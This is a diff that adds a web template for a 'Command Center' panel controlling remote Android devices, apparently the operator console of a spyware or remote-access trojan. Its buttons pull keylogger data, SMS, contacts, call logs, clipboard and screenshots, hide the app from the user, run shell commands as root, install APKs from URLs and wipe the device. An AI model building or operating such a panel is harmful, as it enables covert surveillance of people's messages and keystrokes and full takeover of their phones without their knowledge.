@@ -1,0 +1,361 @@
+{% extends "base/commands.html" %}
+
+{% block extra_css %}
+<style>
+    .cmd-btn {
+        min-width: 140px;
+        margin: 4px;
+        padding: 10px 16px;
+        border-radius: 8px;
+        font-weight: 600;
+        font-size: 13px;
+        transition: all 0.2s;
+    }
+    .cmd-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    .cmd-btn i { margin-right: 6px; }
+    .cmd-danger { background: #dc3545; color: #fff; border: none; }
+    .cmd-danger:hover { background: #c82333; color: #fff; }
+    .cmd-warning { background: #ffc107; color: #212529; border: none; }
+    .cmd-warning:hover { background: #e0a800; color: #212529; }
+    .cmd-info { background: #17a2b8; color: #fff; border: none; }
+    .cmd-info:hover { background: #138496; color: #fff; }
+    .cmd-success { background: #28a745; color: #fff; border: none; }
+    .cmd-success:hover { background: #218838; color: #fff; }
+    .cmd-secondary { background: #6c757d; color: #fff; border: none; }
+    .cmd-secondary:hover { background: #5a6268; color: #fff; }
+    .status-badge { padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
+    .status-PENDING { background: #ffc107; color: #212529; }
+    .status-SENT { background: #17a2b8; color: #fff; }
+    .status-DELIVERED { background: #007bff; color: #fff; }
+    .status-EXECUTED { background: #28a745; color: #fff; }
+    .status-FAILED { background: #dc3545; color: #fff; }
+    #commandResult { max-height: 300px; overflow-y: auto; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-3">
+    <!-- Header -->
+    <div class="d-flex align-items-center mb-4">
+        <div>
+            <h3 class="mb-1"><i class="bi bi-terminal"></i> Command Center</h3>
+            <p class="text-muted mb-0">
+                <strong>{{ device.device_name or device.device_id[:12] }}</strong>
+                &nbsp;·&nbsp; {{ device.device_ip }}
+                &nbsp;·&nbsp;
+                <span class="badge {{ 'bg-success' if device.status == 'online' else 'bg-secondary' }}">
+                    {{ device.status or 'unknown' }}
+                </span>
+            </p>
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- Command Buttons -->
+        <div class="col-lg-8">
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-shield-lock"></i> Device Control</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-danger" onclick="sendCmd('LOCK_DEVICE')">
+                        <i class="bi bi-lock"></i> Lock
+                    </button>
+                    <button class="cmd-btn cmd-success" onclick="sendCmd('UNLOCK_DEVICE')">
+                        <i class="bi bi-unlock"></i> Unlock
+                    </button>
+                    <button class="cmd-btn cmd-danger" onclick="confirmCmd('WIPE_DEVICE', 'This will ERASE ALL DATA on the device!')">
+                        <i class="bi bi-trash"></i> Wipe
+                    </button>
+                    <button class="cmd-btn cmd-warning" onclick="sendCmd('REBOOT_DEVICE')">
+                        <i class="bi bi-arrow-repeat"></i> Reboot
+                    </button>
+                    <button class="cmd-btn cmd-warning" onclick="sendCmd('SHUTDOWN_DEVICE')">
+                        <i class="bi bi-power"></i> Shutdown
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="promptInput('SET_PASSWORD', 'Enter new device password:', 'password')">
+                        <i class="bi bi-key"></i> Set Password
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="sendCmd('CLEAR_PASSWORD')">
+                        <i class="bi bi-key-fill"></i> Clear Password
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-grid"></i> App Management</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-info" onclick="promptInput('INSTALL_APP', 'Enter APK URL:', 'apk_url')">
+                        <i class="bi bi-download"></i> Install App
+                    </button>
+                    <button class="cmd-btn cmd-danger" onclick="promptInput('UNINSTALL_APP', 'Enter package name:', 'package_name')">
+                        <i class="bi bi-x-circle"></i> Uninstall App
+                    </button>
+                    <button class="cmd-btn cmd-success" onclick="promptInput('LAUNCH_APP', 'Enter package name:', 'package_name')">
+                        <i class="bi bi-play-circle"></i> Launch App
+                    </button>
+                    <button class="cmd-btn cmd-warning" onclick="promptInput('KILL_APP', 'Enter package name:', 'package_name')">
+                        <i class="bi bi-stop-circle"></i> Kill App
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="promptInput('CLEAR_APP_DATA', 'Enter package name:', 'package_name')">
+                        <i class="bi bi-eraser"></i> Clear App Data
+                    </button>
+                    <button class="cmd-btn cmd-success" onclick="sendCmd('START_KIOSK_MODE')">
+                        <i class="bi bi-fullscreen"></i> Start Kiosk
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="sendCmd('STOP_KIOSK_MODE')">
+                        <i class="bi bi-fullscreen-exit"></i> Stop Kiosk
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-collection"></i> Data Collection</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_LOCATION')">
+                        <i class="bi bi-geo-alt"></i> Location
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_DEVICE_INFO')">
+                        <i class="bi bi-phone"></i> Device Info
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_BATTERY_INFO')">
+                        <i class="bi bi-battery-half"></i> Battery
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_CONTACTS')">
+                        <i class="bi bi-people"></i> Contacts
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_SMS')">
+                        <i class="bi bi-chat-dots"></i> SMS
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_CALL_LOGS')">
+                        <i class="bi bi-telephone"></i> Call Logs
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_APPS')">
+                        <i class="bi bi-grid"></i> Apps
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_KEYLOGGER_DATA')">
+                        <i class="bi bi-keyboard"></i> Keylogger
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('CAPTURE_SCREENSHOT')">
+                        <i class="bi bi-camera"></i> Screenshot
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('GET_CLIPBOARD')">
+                        <i class="bi bi-clipboard"></i> Clipboard
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-chat-left-text"></i> Communication</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-success" onclick="promptSms()">
+                        <i class="bi bi-envelope"></i> Send SMS
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptInput('MAKE_CALL', 'Enter phone number:', 'phone_number')">
+                        <i class="bi bi-telephone-outbound"></i> Make Call
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-volume-up"></i> Audio & Display</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-info" onclick="promptInput('SET_VOLUME', 'Volume level (0-100):', 'level')">
+                        <i class="bi bi-volume-up"></i> Set Volume
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptSelect('SET_RINGTONE_MODE', 'Select mode:', 'mode', ['normal','silent','vibrate'])">
+                        <i class="bi bi-bell"></i> Ringtone Mode
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('PLAY_SOUND')">
+                        <i class="bi bi-music-note"></i> Play Sound
+                    </button>
+                    <button class="cmd-btn cmd-warning" onclick="sendCmd('VIBRATE')">
+                        <i class="bi bi-phone-vibrate"></i> Vibrate
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptInput('SET_BRIGHTNESS', 'Brightness (0-255):', 'level')">
+                        <i class="bi bi-brightness-high"></i> Brightness
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptInput('SET_SCREEN_TIMEOUT', 'Timeout (ms):', 'timeout')">
+                        <i class="bi bi-clock"></i> Screen Timeout
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-wifi"></i> Network & Stealth</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('TOGGLE_WIFI')">
+                        <i class="bi bi-wifi"></i> Toggle WiFi
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="sendCmd('TOGGLE_BLUETOOTH')">
+                        <i class="bi bi-bluetooth"></i> Toggle Bluetooth
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="sendCmd('HIDE_APP')">
+                        <i class="bi bi-eye-slash"></i> Hide App
+                    </button>
+                    <button class="cmd-btn cmd-success" onclick="sendCmd('SHOW_APP')">
+                        <i class="bi bi-eye"></i> Show App
+                    </button>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-terminal"></i> Advanced</h6></div>
+                <div class="card-body">
+                    <button class="cmd-btn cmd-warning" onclick="promptShell()">
+                        <i class="bi bi-terminal"></i> Shell Exec
+                    </button>
+                    <button class="cmd-btn cmd-danger" onclick="promptInput('DELETE_FILE', 'File path on device:', 'path')">
+                        <i class="bi bi-file-x"></i> Delete File
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptDownload()">
+                        <i class="bi bi-cloud-download"></i> Download File
+                    </button>
+                    <button class="cmd-btn cmd-secondary" onclick="promptInput('SET_CLIPBOARD', 'Text to set:', 'text')">
+                        <i class="bi bi-clipboard-plus"></i> Set Clipboard
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptInput('SHOW_TOAST', 'Message to show:', 'message')">
+                        <i class="bi bi-chat-square-text"></i> Show Toast
+                    </button>
+                    <button class="cmd-btn cmd-info" onclick="promptInput('OPEN_URL', 'URL to open:', 'url')">
+                        <i class="bi bi-link-45deg"></i> Open URL
+                    </button>
+                </div>
+            </div>
+
+            <!-- Command Result -->
+            <div class="card mb-3" id="resultCard" style="display:none;">
+                <div class="card-header"><h6 class="mb-0"><i class="bi bi-terminal"></i> Last Result</h6></div>
+                <div class="card-body">
+                    <pre id="commandResult" class="bg-dark text-light p-3 rounded" style="font-size: 12px;"></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Command History -->
+        <div class="col-lg-4">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h6 class="mb-0"><i class="bi bi-clock-history"></i> Command History</h6>
+                    <button class="btn btn-sm btn-outline-primary" onclick="refreshHistory()">
+                        <i class="bi bi-arrow-clockwise"></i>
+                    </button>
+                </div>
+                <div class="card-body p-0" style="max-height: 600px; overflow-y: auto;">
+                    <table class="table table-sm table-hover mb-0" style="font-size: 12px;">
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Status</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="historyTable">
+                            {% for cmd in commands %}
+                            <tr>
+                                <td><code>{{ cmd.command_type }}</code></td>
+                                <td><span class="status-badge status-{{ cmd.status }}">{{ cmd.status }}</span></td>
+                                <td>{{ cmd.created_at[:16] if cmd.created_at else '-' }}</td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+const DEVICE_ID = "{{ device.device_id }}";
+const CSRF_TOKEN = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+function sendCmd(commandType, payload) {
+    const formData = new FormData();
+    formData.append('command_type', commandType);
+    if (payload) formData.append('payload', JSON.stringify(payload));
+
+    fetch(`/device/${DEVICE_ID}/send-command`, {
+        method: 'POST',
+        headers: { 'X-CSRFToken': CSRF_TOKEN },
+        body: formData,
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.error) {
+            toastr.error(data.error, 'Command Failed');
+        } else {
+            toastr.success(`${commandType} ${data.delivered ? 'delivered' : 'queued'}`, 'Command Sent');
+            if (data.command && data.command.result) {
+                document.getElementById('resultCard').style.display = 'block';
+                document.getElementById('commandResult').textContent =
+                    JSON.stringify(JSON.parse(data.command.result), null, 2);
+            }
+        }
+        refreshHistory();
+    })
+    .catch(err => toastr.error(err.message, 'Error'));
+}
+
+function confirmCmd(commandType, warning) {
+    if (confirm(`WARNING: ${warning}\n\nAre you sure you want to execute ${commandType}?`)) {
+        sendCmd(commandType);
+    }
+}
+
+function promptInput(commandType, message, key) {
+    const val = prompt(message);
+    if (val !== null && val !== '') {
+        sendCmd(commandType, { [key]: val });
+    }
+}
+
+function promptSelect(commandType, message, key, options) {
+    const val = prompt(`${message}\nOptions: ${options.join(', ')}`);
+    if (val !== null && options.includes(val)) {
+        sendCmd(commandType, { [key]: val });
+    }
+}
+
+function promptSms() {
+    const phone = prompt('Enter phone number:');
+    if (!phone) return;
+    const msg = prompt('Enter message:');
+    if (msg !== null) {
+        sendCmd('SEND_SMS', { phone_number: phone, message: msg });
+    }
+}
+
+function promptShell() {
+    const cmd = prompt('Enter shell command:');
+    if (!cmd) return;
+    const useRoot = confirm('Run as root (su)?');
+    sendCmd('SHELL_EXEC', { command: cmd, root: useRoot });
+}
+
+function promptDownload() {
+    const url = prompt('File URL to download:');
+    if (!url) return;
+    const path = prompt('Save path on device (optional):');
+    sendCmd('DOWNLOAD_FILE', { url: url, path: path || '' });
+}
+
+function refreshHistory() {
+    fetch(`/device/${DEVICE_ID}/commands-history`)
+    .then(r => r.json())
+    .then(commands => {
+        const tbody = document.getElementById('historyTable');
+        tbody.innerHTML = commands.map(cmd => `
+            <tr>
+                <td><code>${cmd.command_type}</code></td>
+                <td><span class="status-badge status-${cmd.status}">${cmd.status}</span></td>
+                <td>${cmd.created_at ? cmd.created_at.substring(0, 16) : '-'}</td>
+            </tr>
+        `).join('');
+    });
+}
+
+// Auto-refresh every 10 seconds
+setInterval(refreshHistory, 10000);
+</script>
+{% endblock %}
